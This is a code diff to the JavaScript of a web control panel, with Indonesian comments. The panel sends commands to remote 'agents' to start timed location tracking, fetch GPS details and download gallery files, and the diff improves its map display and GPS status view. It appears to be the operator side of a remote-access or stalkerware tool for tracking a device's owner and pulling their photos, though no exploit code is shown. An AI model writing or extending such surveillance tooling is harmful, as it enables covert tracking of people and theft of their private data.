@@ -272,6 +272,11 @@ case 'gallery_data':
     console.log('🖼️ Gallery data received:', data);
     handleGalleryData(data);
     break; 
+    // ✅ TAMBAHKAN DI SINI!
+        case 'gps_status':
+            console.log('🛰️ GPS Status received:', data);
+            handleGPSStatus(data);
+            break;
         default:
             console.log('Unknown message type:', data.type);
     }
@@ -3277,24 +3282,52 @@ function getBrowserAll() {
 // ==================== HANDLE LOCATION TRACKING DATA ====================
 function handleLocationTrackingData(data) {
     console.log('📍 Location tracking data received:', data);
+    console.log('   Type:', data.type);
     
-    // Initialize map if not already
+    // ✅ FIX: Initialize map if not already done
     if (!isMapInitialized) {
+        console.log('🗺️ Initializing map first...');
         initLocationMap();
     }
     
-    switch (data.type) {
-        case 'location_status':
-            handleLocationStatusEnhanced(data);
-            break;
-        case 'location_history':
-            handleLocationHistoryEnhanced(data);
-            break;
-        case 'location_update':
-            handleLocationUpdateEnhanced(data);
-            break;
-        default:
-            console.log('Unknown location type:', data.type);
+    try {
+        // ✅ Handle berbagai format data yang mungkin datang dari backend
+        switch (data.type) {
+            case 'location_update':
+                console.log('📍 Location update received');
+                if (data.location) {
+                    console.log('   Using data.location');
+                    updateMapWithLocation(data.location);
+                } else if (data.data) {
+                    console.log('   Using data.data');
+                    updateMapWithLocation(data.data);
+                } else {
+                    handleLocationUpdateEnhanced(data);
+                }
+                break;
+                
+            case 'location_status':
+                console.log('📍 Location status received');
+                handleLocationStatusEnhanced(data);
+                break;
+                
+            case 'location_history':
+                console.log('📍 Location history received, entries:', data.locations?.length || data.data?.length || 0);
+                handleLocationHistoryEnhanced(data);
+                break;
+                
+            default:
+                console.warn('⚠️ Unknown location data type:', data.type);
+                // Try to extract location anyway
+                if (data.location) {
+                    updateMapWithLocation(data.location);
+                } else if (data.data && typeof data.data === 'object' && !Array.isArray(data.data)) {
+                    updateMapWithLocation(data.data);
+                }
+        }
+    } catch (e) {
+        console.error('❌ Error handling location data:', e);
+        console.error('   Raw data:', data);
     }
 }
 
@@ -3529,7 +3562,12 @@ function startLocationTracking() {
         return;
     }
     
-    const interval = prompt('📍 Tracking interval in seconds (5-60):', '10');
+    // ✅ TAMBAHKAN PILIHAN INTERVAL LEBIH FLEKSIBEL
+    const interval = prompt('📍 Tracking interval in seconds:\n' +
+        '  5  - Super accurate (more battery)\n' +
+        '  10 - Recommended\n' +
+        '  30 - Battery saver\n' +
+        '  60 - Minimal tracking', '10');
     if (!interval) return;
     
     const seconds = parseInt(interval);
@@ -3538,20 +3576,18 @@ function startLocationTracking() {
         return;
     }
     
-    // Init map first
     initLocationMap();
     isTrackingActive = true;
     trackingInterval = seconds;
     
     sendCommand('LOCATION_TRACK_START', String(seconds));
     addOutputLine(`📍 Starting location tracking every ${seconds} seconds for ${selectedAgent}`, 'info');
+    addOutputLine(`🛰️ GPS accuracy will be shown in Location tab`, 'info');
     
-    // Update status
-    const statusEl = document.getElementById('map-status');
-    if (statusEl) {
-        statusEl.innerHTML = `🟢 Tracking ACTIVE (${seconds}s interval) - waiting for first update...`;
-        statusEl.style.color = '#51cf66';
-    }
+    // ✅ AUTO GET GPS DETAIL
+    setTimeout(() => {
+        sendCommand('GPS_DETAIL');
+    }, 1000);
     
     switchToTab('location');
 }
@@ -4810,9 +4846,10 @@ function createMap(container) {
         // Initial center (will be updated with location)
         const center = [0, 0];
         
+        // ✅ FIX: Changed zoom from 15 to 2 for world view instead of street-level detail at [0,0]
         locationMap = L.map(container.id, {
             center: center,
-            zoom: 15,
+            zoom: 2,  // ✅ FIXED: Changed from 15 to 2
             zoomControl: true,
             fadeAnimation: true,
             attributionControl: true
@@ -4872,33 +4909,69 @@ function createMap(container) {
 }
 
 function updateMapWithLocation(locationData) {
+    // ✅ FIX: Validate input
+    if (!locationData) {
+        console.warn('⚠️ No location data provided');
+        return;
+    }
+    
+    const lat = locationData.latitude || locationData.lat;
+    const lng = locationData.longitude || locationData.lng;
+    
+    // ✅ FIX: Reject coordinates [0, 0] - this is invalid location
+    if ((!lat || !lng) || (lat === 0 && lng === 0)) {
+        console.warn('⚠️ Invalid coordinates, rejecting:', { lat, lng });
+        return;
+    }
+    
+    // ✅ FIX: Validate coordinates are numbers
+    if (typeof lat !== 'number' || typeof lng !== 'number') {
+        console.warn('⚠️ Coordinates are not numbers:', typeof lat, typeof lng);
+        return;
+    }
+    
+    // ✅ FIX: Check range latitude/longitude
+    if (lat < -90 || lat > 90 || lng < -180 || lng > 180) {
+        console.warn('⚠️ Coordinates out of valid range:', { lat, lng });
+        return;
+    }
+    
+    // ✅ FIX: Initialize map if not yet done
     if (!isMapInitialized || !locationMap) {
-        // Store for later
+        console.log('📍 Map not initialized yet, storing data for later:', locationData);
         locationTrackingData.push(locationData);
         return;
     }
     
     try {
-        const lat = locationData.latitude || locationData.lat;
-        const lng = locationData.longitude || locationData.lng;
-        
-        if (!lat || !lng) return;
         
         const latLng = [lat, lng];
         
-        // Update marker
+        console.log('✅ Updating map with location:', latLng);
+        
+        // Update marker position
         if (locationMarker) {
             locationMarker.setLatLng(latLng);
+            console.log('  ✓ Marker updated');
         }
         
-        // Update path
+        // Add to path
         locationPath.push(latLng);
         if (locationPolyline) {
             locationPolyline.setLatLngs(locationPath);
+            console.log('  ✓ Polyline updated, path length:', locationPath.length);
         }
         
-        // Center map on latest location
-        locationMap.panTo(latLng);
+        // ✅ FIX: Use setView() instead of panTo() to properly zoom to location
+        // panTo() only pans but doesn't change zoom level
+        // setView() both pans and zooms to the proper level
+        if (locationMap) {
+            locationMap.setView(latLng, 15, {  // Zoom to 15 for device detail
+                animate: true,
+                duration: 1
+            });
+            console.log('  ✓ Map view centered at zoom 15');
+        }
         
         // Add to data
         locationTrackingData.push(locationData);
@@ -4913,7 +4986,26 @@ function updateMapWithLocation(locationData) {
 
 function updateLocationInfo(locationData) {
     const container = document.getElementById('location-content');
-    if (!container) return;
+    if (!container) {
+        console.warn('⚠️ location-content container not found');
+        return;
+    }
+    
+    // ✅ FIX: Validate input
+    if (!locationData) {
+        console.warn('⚠️ No location data to display');
+        return;
+    }
+    
+    // ✅ FIX: Validate coordinates before showing
+    const lat = locationData.latitude || locationData.lat;
+    const lng = locationData.longitude || locationData.lng;
+    
+    // Only show if we have valid coordinates
+    if (!lat || !lng || (lat === 0 && lng === 0)) {
+        console.warn('⚠️ Invalid coordinates for info panel:', { lat, lng });
+        return;
+    }
     
     // Remove old info panel if exists
     const oldInfo = container.querySelector('.location-info-panel');
@@ -5189,6 +5281,88 @@ function downloadGalleryImage(path) {
     sendCommand('DOWNLOAD_FILE', path);
 }
 
+// ==================== GPS STATUS HANDLER ====================
+
+function handleGPSStatus(data) {
+    console.log('🛰️ GPS Status received:', data);
+    
+    const container = document.getElementById('location-content');
+    if (!container) return;
+    
+    const status = data.data || {};
+    
+    // Cari atau buat card GPS status
+    let gpsCard = container.querySelector('.gps-status-card');
+    if (!gpsCard) {
+        gpsCard = document.createElement('div');
+        gpsCard.className = 'gps-status-card';
+        gpsCard.style.cssText = `
+            background: #0d1520;
+            border-radius: 8px;
+            padding: 12px 16px;
+            border: 1px solid #1a2633;
+            margin-bottom: 10px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 8px;
+        `;
+        container.prepend(gpsCard);
+    }
+    
+    const gpsEnabled = status.gps_enabled || false;
+    const networkEnabled = status.network_enabled || false;
+    const accuracy = status.accuracy || 'N/A';
+    const provider = status.provider || 'N/A';
+    const quality = status.quality || 'Unknown';
+    const satellites = status.satellites || 'N/A';
+    
+    // Warna quality
+    let qualityColor = '#6b7a8a';
+    if (quality.includes('Excellent')) qualityColor = '#51cf66';
+    else if (quality.includes('Good')) qualityColor = '#ffd93d';
+    else if (quality.includes('Fair')) qualityColor = '#ff922b';
+    else if (quality.includes('Poor')) qualityColor = '#ff6b6b';
+    
+    gpsCard.innerHTML = `
+        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
+            <div style="color:#6b7a8a;font-size:9px;">📡 GPS</div>
+            <div style="color:${gpsEnabled ? '#51cf66' : '#ff6b6b'};font-weight:bold;font-size:13px;">
+                ${gpsEnabled ? '✅ Active' : '❌ Disabled'}
+            </div>
+        </div>
+        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
+            <div style="color:#6b7a8a;font-size:9px;">📶 Network</div>
+            <div style="color:${networkEnabled ? '#51cf66' : '#ff6b6b'};font-weight:bold;font-size:13px;">
+                ${networkEnabled ? '✅ Active' : '❌ Disabled'}
+            </div>
+        </div>
+        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
+            <div style="color:#6b7a8a;font-size:9px;">🎯 Accuracy</div>
+            <div style="color:#00d2ff;font-weight:bold;font-size:13px;">
+                ${accuracy}m
+            </div>
+        </div>
+        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
+            <div style="color:#6b7a8a;font-size:9px;">📶 Provider</div>
+            <div style="color:#c8d6e5;font-weight:bold;font-size:12px;">
+                ${provider}
+            </div>
+        </div>
+        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
+            <div style="color:#6b7a8a;font-size:9px;">🛰️ Satellites</div>
+            <div style="color:#ffd93d;font-weight:bold;font-size:13px;">
+                ${satellites}
+            </div>
+        </div>
+        <div style="background:#0a0e17;padding:6px 10px;border-radius:4px;border:1px solid #1a2633;text-align:center;">
+            <div style="color:#6b7a8a;font-size:9px;">⭐ Quality</div>
+            <div style="color:${qualityColor};font-weight:bold;font-size:13px;">
+                ${quality}
+            </div>
+        </div>
+    `;
+}
+
 // ==================== ABOUT & HELP ====================
 
 function showAbout() {
@@ -5220,4 +5394,3 @@ function toggleTheme() {
     document.body.style.background = document.body.style.background === '#0a0e17' ? '#1a1a2e' : '#0a0e17';
     addOutputLine('🎨 Theme toggled', 'info');
 }
-
